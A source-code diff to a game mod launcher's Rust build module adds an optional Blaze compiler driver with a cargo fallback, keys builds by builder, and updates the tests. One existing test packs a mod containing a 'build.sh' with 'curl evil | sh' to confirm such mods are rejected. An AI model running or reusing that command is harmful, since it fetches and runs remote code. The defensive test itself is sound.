@@ -15,10 +15,10 @@
 //! the profile, so the same set builds once). The instance the mods are installed in plays it, and
 //! its next build stays on the same revision ([`base_for`]) until the player asks to update
 //! ([`update_for`]), so a rebuild compiles only what the mods changed.
-use crate::backend;
 use crate::i18n::{tr, trf};
 use crate::instances::{self, Instance};
 use crate::rust_toolchain::{self, Toolchain};
+use crate::{backend, blaze};
 use sha2::{Digest, Sha256};
 use std::fs;
 use std::io::{BufRead, BufReader, Write};
@@ -69,6 +69,61 @@ impl Profile {
             Self::Release
         } else {
             Self::Fast
+        }
+    }
+}
+
+/// The compiler driver for native builds.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+pub enum Builder {
+    #[default]
+    Cargo,
+    Blaze,
+}
+
+impl Builder {
+    pub fn name(self) -> &'static str {
+        match self {
+            Self::Cargo => "cargo",
+            Self::Blaze => "blaze",
+        }
+    }
+
+    pub fn parse(text: &str) -> Option<Self> {
+        match text {
+            "cargo" => Some(Self::Cargo),
+            "blaze" => Some(Self::Blaze),
+            _ => None,
+        }
+    }
+
+    pub fn from_setting(blaze: bool) -> Self {
+        if blaze {
+            Self::Blaze
+        } else {
+            Self::Cargo
+        }
+    }
+
+    fn available(self, supported: bool) -> Self {
+        if supported {
+            self
+        } else {
+            Self::Cargo
+        }
+    }
+
+    fn target(self, root: &Path) -> PathBuf {
+        root.join(match self {
+            Self::Cargo => "target",
+            Self::Blaze => "target-blaze",
+        })
+    }
+
+    fn record_key(self, profile: Profile) -> String {
+        match self {
+            Self::Cargo => profile.name().to_owned(),
+            Self::Blaze => format!("blaze-{}", profile.name()),
         }
     }
 }
@@ -171,16 +226,16 @@ fn read_records(path: &Path) -> std::collections::BTreeMap<String, Record> {
 }
 
 /// The last build of `profile` that compiled, if its folder in `native/target/` is still there.
-fn last_record(profile: Profile) -> Option<Record> {
-    if !root().join("target").join(profile.name()).is_dir() {
+fn last_record(builder: Builder, profile: Profile) -> Option<Record> {
+    if !builder.target(&root()).join(profile.name()).is_dir() {
         return None;
     }
-    read_records(&records_path()).remove(profile.name())
+    read_records(&records_path()).remove(&builder.record_key(profile))
 }
 
-fn save_record(profile: Profile, record: &Record) {
+fn save_record(builder: Builder, profile: Profile, record: &Record) {
     let mut all = read_records(&records_path());
-    all.insert(profile.name().into(), record.clone());
+    all.insert(builder.record_key(profile), record.clone());
     if let Ok(text) = serde_json::to_vec_pretty(&all) {
         let _ = fs::write(records_path(), text);
     }
@@ -773,12 +828,19 @@ pub fn version_for(
     revision: &str,
     mixins: &str,
     profile: Profile,
+    builder: Builder,
     bundles: &[Bundle],
 ) -> Result<String, String> {
     let mut hash = Sha256::new();
     for part in [
         mixins,
         profile.name(),
+        builder.name(),
+        if builder == Builder::Blaze {
+            blaze::VERSION
+        } else {
+            ""
+        },
         FEATURES,
         rust_toolchain::VERSION,
         revision,
@@ -1210,6 +1272,7 @@ pub fn build(
     instance: &Instance,
     anyway: bool,
     profile: Profile,
+    builder: Builder,
     progress: impl Fn(Step),
 ) -> Result<String, String> {
     let started = std::time::Instant::now();
@@ -1279,7 +1342,8 @@ pub fn build(
         Some(MIXINS_REV),
         |r| committed("horizon-rust/horizon-mixins", r),
     )?;
-    let version = version_for(&revision, &mixins, profile, &mods)?;
+    let mut builder = builder.available(blaze::host().is_some());
+    let mut version = version_for(&revision, &mixins, profile, builder, &mods)?;
     let now = Record {
         horizon: revision.clone(),
         mixins: mixins.clone(),
@@ -1289,7 +1353,7 @@ pub fn build(
             .collect::<Result<_, String>>()?,
     };
     let exists = backend::installed().contains(&version);
-    let plan = classify(exists, last_record(profile).as_ref(), &now);
+    let plan = classify(exists, last_record(builder, profile).as_ref(), &now);
     progress(Step::Plan(plan.clone(), profile));
     if !exists {
         rust_toolchain::linker()?;
@@ -1317,14 +1381,12 @@ pub fn build(
             progress(Step::Crates);
             lock_crates(&rust, &source, &stage)?;
         }
-        let target = real.join("target");
+        let mut target = builder.target(&real);
         // A revision without `[profile.fast]` builds with `release`: the build says so.
         let profile = profile_of(&stage, profile);
         let (mut crates, mut total, mut name) = (0, None, String::new());
-        run(
-            compile(&rust, &stage, &target, profile),
-            "Compiling the game",
-            |line| {
+        let mut compile_game = |cmd| {
+            run(cmd, "Compiling the game", |line| {
                 for event in parse_cargo(line) {
                     match event {
                         Cargo::Compiling(n) => {
@@ -1345,17 +1407,80 @@ pub fn build(
                         });
                     }
                 }
-            },
-        )
-        .map_err(|e| blame(crates::locked(e)))?;
-        save_record(profile, &now);
+            })
+        };
+        if builder == Builder::Blaze {
+            let mut fetch = cargo(&rust, &stage, "fetch");
+            fetch.arg("--locked");
+            run(fetch, "Downloading the crates", |_| {}).map_err(|e| blame(crates::locked(e)))?;
+            let mut metadata = cargo(&rust, &stage, "metadata");
+            metadata.args(["--locked", "--offline", "--format-version", "1"]);
+            run(metadata, "Checking the lockfile", |_| {}).map_err(|e| blame(crates::locked(e)))?;
+            let attempt = blaze::install(|_| {}).and_then(|bin| {
+                let cargo_cmd = compile(&rust, &stage, &target, profile);
+                let mut cmd = blaze::command(&bin);
+                rust_toolchain::low_priority(&mut cmd);
+                cmd.args(cargo_cmd.get_args());
+                for (key, value) in cargo_cmd.get_envs() {
+                    if [
+                        "HOME",
+                        "XDG_CACHE_HOME",
+                        "XDG_CONFIG_HOME",
+                        "XDG_DATA_HOME",
+                        "XDG_STATE_HOME",
+                        "XDG_RUNTIME_DIR",
+                        "TMPDIR",
+                        "TMP",
+                        "TEMP",
+                        "BLAZE_CACHE",
+                        "RUSTUP_HOME",
+                    ]
+                    .iter()
+                    .any(|name| key == *name)
+                    {
+                        continue;
+                    }
+                    if let Some(value) = value {
+                        cmd.env(key, value);
+                    } else {
+                        cmd.env_remove(key);
+                    }
+                }
+                if let Some(dir) = cargo_cmd.get_current_dir() {
+                    cmd.current_dir(dir);
+                }
+                let result = compile_game(cmd);
+                let mut stop = blaze::command(&bin);
+                stop.arg("stop");
+                if let Err(error) = run(stop, "Stopping Blaze", |_| {}) {
+                    if let Ok(mut log) = fs::OpenOptions::new().append(true).open(log_path()) {
+                        let _ = writeln!(log, "{error}");
+                    }
+                }
+                result
+            });
+            if let Err(error) = attempt {
+                if let Ok(mut log) = fs::OpenOptions::new().append(true).open(log_path()) {
+                    let _ = writeln!(log, "Blaze failed; building with cargo instead: {error}");
+                }
+                builder = Builder::Cargo;
+                target = builder.target(&real);
+                version = version_for(&revision, &mixins, profile, builder, &mods)?;
+                compile_game(compile(&rust, &stage, &target, profile))
+                    .map_err(|e| blame(crates::locked(e)))?;
+            }
+        } else {
+            compile_game(compile(&rust, &stage, &target, profile))
+                .map_err(|e| blame(crates::locked(e)))?;
+        }
+        save_record(builder, profile, &now);
         // Out of `target` before any post-build bin is built there (`post_build_programs`).
         let binary = real.join("programs").join(backend::CLIENT);
         copy_out(&target.join(profile.name()).join(backend::CLIENT), &binary)?;
         let post = post_build_programs(
             &rust,
             &stage,
-            &target,
+            &Builder::Cargo.target(&real),
             &real.join("programs").join("post-build"),
             profile,
             &progress,
@@ -1368,6 +1493,8 @@ pub fn build(
             "hooks": mods.iter().find_map(|m| m.hooks),
             "rust": rust_toolchain::VERSION,
             "profile": profile.name(),
+            "builder": builder.name(),
+            "blaze": (builder == Builder::Blaze).then_some(blaze::VERSION),
             "mods": mods.iter().map(|m| serde_json::json!({
                 "id": m.id,
                 "version": m.version,
@@ -1530,6 +1657,27 @@ mod tests {
         }
     }
 
+    #[test]
+    fn builder_defaults_to_cargo_and_separates_keys() {
+        let settings: backend::Settings = serde_json::from_str("{}").unwrap();
+        assert!(!settings.native_blaze);
+        assert_eq!(Builder::from_setting(settings.native_blaze), Builder::Cargo);
+        assert_eq!(Builder::Blaze.available(false), Builder::Cargo);
+        assert_eq!(Builder::Blaze.available(true), Builder::Blaze);
+        assert_ne!(
+            Builder::Cargo.record_key(Profile::Fast),
+            Builder::Blaze.record_key(Profile::Fast)
+        );
+        assert_ne!(
+            Builder::Cargo.target(Path::new("/native")),
+            Builder::Blaze.target(Path::new("/native"))
+        );
+        assert_ne!(
+            version_for(A, B, Profile::Fast, Builder::Cargo, &[]).unwrap(),
+            version_for(A, B, Profile::Fast, Builder::Blaze, &[]).unwrap()
+        );
+    }
+
     fn dir(name: &str) -> PathBuf {
         let d = std::env::temp_dir().join(format!("horizon-native-{name}-{}", std::process::id()));
         let _ = fs::remove_dir_all(&d);
@@ -1678,11 +1826,12 @@ mod tests {
         let out = installed_mods(&home).unwrap();
         let path = out.join("veinminer/mixins/veinminer/data/table.bin");
         assert_eq!(fs::read(&path).unwrap(), b"data");
-        let first = version_for(A, B, Profile::Fast, &bundles(&out).unwrap()).unwrap();
+        let first =
+            version_for(A, B, Profile::Fast, Builder::Cargo, &bundles(&out).unwrap()).unwrap();
         fs::write(path, b"changed").unwrap();
         assert_ne!(
             first,
-            version_for(A, B, Profile::Fast, &bundles(&out).unwrap()).unwrap()
+            version_for(A, B, Profile::Fast, Builder::Cargo, &bundles(&out).unwrap()).unwrap()
         );
         pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
@@ -1897,7 +2046,14 @@ mod tests {
         let d = dir("key");
         write_bundle(&d, "hello", "fn hook() {}");
         let key = |revision: &str| {
-            version_for(revision, MIXINS_REV, Profile::Fast, &bundles(&d).unwrap()).unwrap()
+            version_for(
+                revision,
+                MIXINS_REV,
+                Profile::Fast,
+                Builder::Cargo,
+                &bundles(&d).unwrap(),
+            )
+            .unwrap()
         };
         let first = key(A);
         assert!(
@@ -1908,7 +2064,7 @@ mod tests {
         assert_ne!(first, key(B));
         assert_ne!(
             first,
-            version_for(A, B, Profile::Fast, &bundles(&d).unwrap()).unwrap()
+            version_for(A, B, Profile::Fast, Builder::Cargo, &bundles(&d).unwrap()).unwrap()
         );
         fs::write(d.join("hook.rs"), "fn hook() { let _ = 1; }").unwrap();
         assert_ne!(first, key(A));
@@ -1924,7 +2080,8 @@ mod tests {
         backend::copy_dir(&fixture, &d).unwrap();
         let found = bundles(&d).unwrap();
         assert_eq!(found[0].id, "crate_demo");
-        let key = || version_for(A, B, Profile::Fast, &bundles(&d).unwrap()).unwrap();
+        let key =
+            || version_for(A, B, Profile::Fast, Builder::Cargo, &bundles(&d).unwrap()).unwrap();
         let mut seen = vec![key()];
         for file in [
             "engine/src/lib.rs",
@@ -1946,10 +2103,13 @@ mod tests {
         let d = dir("profile-key");
         write_bundle(&d, "hello", "fn hook() {}");
         let found = bundles(&d).unwrap();
-        let fast = version_for(A, B, Profile::Fast, &found).unwrap();
-        let release = version_for(A, B, Profile::Release, &found).unwrap();
+        let fast = version_for(A, B, Profile::Fast, Builder::Cargo, &found).unwrap();
+        let release = version_for(A, B, Profile::Release, Builder::Cargo, &found).unwrap();
         assert_ne!(fast, release);
-        assert_eq!(fast, version_for(A, B, Profile::Fast, &found).unwrap());
+        assert_eq!(
+            fast,
+            version_for(A, B, Profile::Fast, Builder::Cargo, &found).unwrap()
+        );
     }
 
     #[test]
